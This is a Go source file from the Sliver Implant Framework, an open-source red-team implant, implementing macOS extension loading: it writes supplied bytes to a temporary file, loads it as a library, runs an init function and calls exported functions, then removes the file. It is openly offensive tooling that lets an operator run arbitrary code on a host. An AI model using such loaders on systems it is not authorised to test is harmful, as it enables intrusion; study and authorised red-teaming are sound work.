//go:build darwin

package extension

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"io/ioutil"
	"os"
	"sync"
	"unsafe"

	"github.com/ebitengine/purego"
)

type DarwinExtension struct {
	id          string
	data        []byte
	module      uintptr
	arch        string
	serverStore bool
	init        string
	onFinish    func([]byte)
	sync.Mutex
}

func NewDarwinExtension(data []byte, id string, arch string, init string) *DarwinExtension {
	return &DarwinExtension{
		id:   id,
		data: data,
		arch: arch,
		init: init,
	}
}

func (d *DarwinExtension) GetID() string {
	return d.id
}

func (d *DarwinExtension) GetArch() string {
	return d.arch
}

func (d *DarwinExtension) Load() error {
	d.Lock()
	defer d.Unlock()

	extTmpFile, err := createTempFile(d.data)
	if err != nil {
		return err
	}
	defer cleanupTempFile(extTmpFile)
	d.module = purego.Dlopen(extTmpFile, purego.RTLD_NOW|purego.RTLD_GLOBAL)
	if err := purego.Dlerror(); err != "" {
		return errors.New(err)
	}

	if d.init != "" {
		var initFunc func()
		purego.RegisterLibFunc(&initFunc, d.module, d.init)
		initFunc()
	}

	return nil
}

func (d *DarwinExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
	d.Lock()
	defer d.Unlock()
	d.onFinish = onFinish
	outCallback := purego.NewCallback(d.extensionCallback)
	var exportFunc func([]byte, uint64, uintptr) uint32
	purego.RegisterLibFunc(&exportFunc, d.module, export)
	exportFunc(arguments, uint64(len(arguments)), outCallback)
	return nil
}

func (d *DarwinExtension) extensionCallback(data uintptr, length uintptr) {
	outDataSize := int(length)
	outBytes := unsafe.Slice((*byte)(unsafe.Pointer(data)), outDataSize)
	d.onFinish(outBytes)
}

func createTempFile(data []byte) (string, error) {
	tmpFile, err := ioutil.TempFile("", "")
	if err != nil {
		return "", err
	}
	defer tmpFile.Close()
	_, err = tmpFile.Write(data)
	if err != nil {
		return "", err
	}
	return tmpFile.Name(), nil
}

func cleanupTempFile(path string) error {
	return os.Remove(path)
}
